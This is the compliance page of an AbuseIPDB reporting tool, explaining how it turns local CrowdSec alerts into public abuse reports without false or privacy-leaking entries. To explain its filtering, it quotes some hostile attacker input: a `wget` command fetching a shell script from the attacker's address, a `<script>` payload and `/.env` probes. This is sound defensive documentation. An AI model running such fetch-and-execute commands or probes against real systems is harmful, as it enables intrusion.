**English** | [Polski](pl/COMPLIANCE.md)

Version: 3.6.29 (`abuseipdb_report.py`)

# AbuseIPDB compliance

Verified on 2026-09-29 against the raw AbuseIPDB documentation (API v2, the `bulk-report` form, the reporting policy,
the FAQ and the category list). The policy text can change; re-check it before relying on this page.

## Policy rules and how they are met

| Rule (source) | Implementation |
|---|---|
| Reports older than 60 days are forbidden (policy) | Hard filter `MAX_AGE_DAYS = 60` on every row; the validator rejects older dates too. |
| A report needs a detailed description: port, payload, timestamps (policy) | Comment holds protocol and ports, scenario names, event count, time range and real HTTP paths. |
| Keep comments short; no e-mail or IP address in the comment (FAQ) | Comment never contains the reported IP, the host name or our domains; the validator enforces it (our names come from `OWN_NAME_MARKERS` in the config; a live upload is refused while the list is empty or still holds the example values). A hostile sample request that contains such a name is omitted from the comment instead of failing the file. |
| Report an IP about once a day for continuous abuse (FAQ) | One run per day, one row per IP, 20 h guard in the wrapper. |
| No spoofable sources such as SYN/UDP floods; TCP only after a completed three-way handshake, UDP never (policy) | Only application-log scenarios (HTTP, SSH): the request or login attempt reached the application, so the TCP handshake was complete. |
| Do not report based on someone else's confidence score (policy) | Source is local alerts only (`kind == "crowdsec"`); community blocklist bans are ignored. |
| False reports risk account suspension | Seven independent safeguards, see below. |

## Safeguards against reporting our own or an innocent address

1. Non-global addresses (private, loopback, link-local, reserved, multicast, CGNAT 100.64.0.0/10, documentation
   ranges) are never reported. `is_private` alone does not catch CGNAT, so `is_global` is used.
2. `EXCLUDE_SCENARIOS`: scenarios with a documented history of false alarms on legitimate traffic
   (`http-crawl-non_statics` fired on WebDAV bulk uploads). They stay in CrowdSec for banning but are not reported.
3. `WEAK_ONLY_SCENARIOS`: an address whose only scenario is a weak signal (`http-bad-user-agent`, typical of
   passive research scanners) is not reported; one more specific scenario next to it qualifies it.
4. Exclusion list (`EXCLUDE` entries of `~/.secrets/abuseipdb.conf` plus the deprecated `~/.secrets/abuseipdb_exclude.txt`),
   enabled by default. An invalid entry stops the run (exit code 2) instead of being skipped, because a skipped entry
   would make the address the operator wanted protected reportable.
5. SSH auto-trust: every address with a successful SSH login in the last 60 days is excluded. The login line must
   start with `Accepted <method> for`, so an attacker using the user name "Accepted" cannot exclude themselves.
   Only a COMPLETE login counts (with a second factor the first step is logged as `Partial ...` and ignored).
   Both unit names are read (`ssh` on Debian/Ubuntu, `sshd` on RHEL/Fedora/Arch). Trusted methods: `publickey`,
   `password`, `keyboard-interactive/<device>`, `hostbased`, `gssapi-*`; `Accepted none` (no authentication at all) is
   not trusted. A journal the user cannot fully read is reported loudly instead of silently shrinking the trust.
   Addresses are also kept in `~/.secrets/ssh_trusted_seen.txt` because the journal is trimmed.
   An IPv6 login trusts its whole /64 network (config key `SSH_TRUST_IPV6_PREFIX`, 64 to 128, default 64), because an
   IPv6 machine rotates "temporary" addresses inside its /64; a wider network than /64 cannot be configured, and 128
   gives the exact-address behaviour for a /64 shared between customers. IPv4 is always trusted exactly, and an
   IPv4-mapped address (`::ffff:a.b.c.d`) is treated as the plain IPv4. The remembered list keeps single addresses;
   the widening happens when it is read. Other devices in the same /64 are therefore not reported either:
   under-reporting, never a false report.
6. The server's own public addresses (from `ip addr`) are always excluded.
7. Unknown scenarios are never reported: only scenarios of the author `crowdsecurity` that are in `CATEGORY_MAP` or
   named after a real CVE id (`cve-YYYY-NNNN...`) qualify. A CVE id in the name of another author's scenario is not
   enough (`someone/postfix-cve-...` is not a web application attack). A scenario for another service (postfix,
   MySQL) or the operator's own application would otherwise be published as "hacking", which is a false report. A
   scenario of another author is reported only after the operator adds it to `CATEGORY_MAP` under its full name
   (`author/name`); the same short name from a different author (`someone/ssh-bf`) is not trusted.

Deliberately not done: an ASN allowlist (an ASN tells where a machine is rented, not about intent) and reporting
CIDR ranges (the bulk CSV takes single addresses).

## Correctness of the data in a report

- **Event count.** One HTTP request often feeds several CrowdSec scenarios at once. Summing `events_count` over all
  alerts inflated the counter by about 20 % on real data. The count is now the larger of the number of unique
  requests and the biggest per-scenario sum. It is a lower bound, never exaggerated.
- **Time.** SSH events read from journald carry local time labelled as UTC (a +2 h shift in CEST). Times therefore
  come from the alert's `start_at` / `stop_at` / `created_at`, never from `events[].timestamp`. HTTP events are not
  affected.
- **Protocol.** Taken from the events' `service` field (http or ssh). If it is missing, the scenario prefix is used;
  an unknown protocol produces no "Target" sentence instead of a guess.
- **Ports.** CrowdSec events carry no port, so the HTTP ports in a report are what the operator declares with
  `HTTP_PORTS` in the config (default `80/443`: a typical reverse proxy accepts 80 and 443; on the author's server about
  4 % HTTP and 96 % HTTPS). HTTP reports say "HTTP/HTTPS (ports 80/443)", or "HTTP/HTTPS (port 8443)" for a single
  port. Set it if your web server listens elsewhere, or the public report names a wrong port. Only digits and `/` are
  accepted, so nothing else can reach the comment through this key.
- **HTTP 200 in a report.** A "200" on paths like `/.env` is usually a single-page-app fallback that returns HTML,
  not a leak. The report states the status truthfully.
- **Sample requests come from the attacker.** The HTTP paths in the comment are typed by the attacker, who may put our
  domain name in them (scanners paste the target host name into the path) or his own address (`wget http://<his IP>/x.sh`).
  A sample that contains an own-name marker, the reported IP or one of the server's own public addresses is left out
  of the comment; the report and its other samples stay. Before 3.6.4 one such path made the validator reject the
  whole file (no reports that day, an alert, a catch-up on the next run). The validator itself is unchanged and still
  rejects such a comment as the last line of defence.
- **Credentials in sample requests.** The comment goes into a public database, so the VALUES of query parameters
  whose name looks like a credential (`token`, `key`, `api_key`, `secret`, `password`, `session`, `PHPSESSID`, `auth`,
  `sig`, `jwt`, `code`, `csrf` and similar) are replaced by `***` (`?token=***&x=1`). The rest of the request stays, so
  an attack payload in an ordinary parameter remains visible as evidence (`keyword=<script>` is not masked, because the
  name is matched as a whole word, not as a substring). This is best effort, not a guarantee: a secret inside the path
  itself (`/share/<token>`), under an unusual parameter name or in a percent-encoded name is not recognised.
- **E-mail addresses in sample requests.** The AbuseIPDB FAQ asks not to put personal information in comments, so a
  sample that looks like it contains an e-mail address is left out, like a sample with an own name. The own-name, reported-IP and e-mail checks also run on the percent-decoded text (one and two rounds), so `www%2Eexample%2Eorg` is caught like `www.example.org`; the validator does the same.
- **Quotes and backslashes.** The bulk-report page says that backslashes and quotes require escaping: the AbuseIPDB
  CSV parser treats a backslash as an escape character. A double quote is written as `%22` and the comment never ends
  with a backslash; the validator rejects a backslash before a quote or at the end. Other backslashes stay as evidence.

## Categories

- Categories are mapped per scenario in `CATEGORY_MAP`; never assign a category stronger than what the log shows.
- A scenario that is not in the map is skipped and listed on stderr (`unknown scenario ... - not reported`); there is
  no default category. The one exception is a `crowdsecurity` scenario named after a CVE id, which gets 15,21 (hacking + web
  application attack), because an exploit attempt is what such a scenario detects.
- `http-open-proxy` uses 14 (port scan / vulnerable services). Category 9 would claim that the reported host itself
  is an open proxy, while the attacker only tried to use ours.
- Category 4 (DDoS) is not used: exceeding a rate limit is not a volumetric attack.
- Category 22 (SSH) is always combined with a more specific one (brute force, port scan or hacking).

## API and file limits

| Item | Limit |
|---|---|
| CSV size | under 8 MB and at most 10,000 lines including the header |
| Comment | truncated after 1,024 bytes |
| Columns | `IP`, `Categories`, `ReportDate`, `Comment` (any order) |
| `ReportDate` | ISO 8601 with a timezone, the time of the latest observation, not older than two months |
| Categories | integers 1 to 23; multiple categories are quoted in the CSV |
| Duplicates | same IP at most once per 15 minutes; same comment and categories within 24 h are merged |
| Daily `bulk-report` requests | Standard 5, Basic 100, Premium 500 (API documentation); the free Webmaster and Supporter badges raise the Standard limit (20 seen on an account with both). This project uses one per day |
| Address families | `IP` accepts IPv4 and IPv6 ("A valid IPv4 or IPv6 IP address", bulk-report form, checked 2026-10-01); the documentation says nothing about CIDR ranges or /64 handling, and this tool reports single addresses only |
| Errors without `Accept: application/json` | returned as an HTML page, so the wrapper always sends the header |
| Rejected rows | listed in `invalidReports` (for example "Invalid IP", "Duplicate IP", "Invalid Category") |
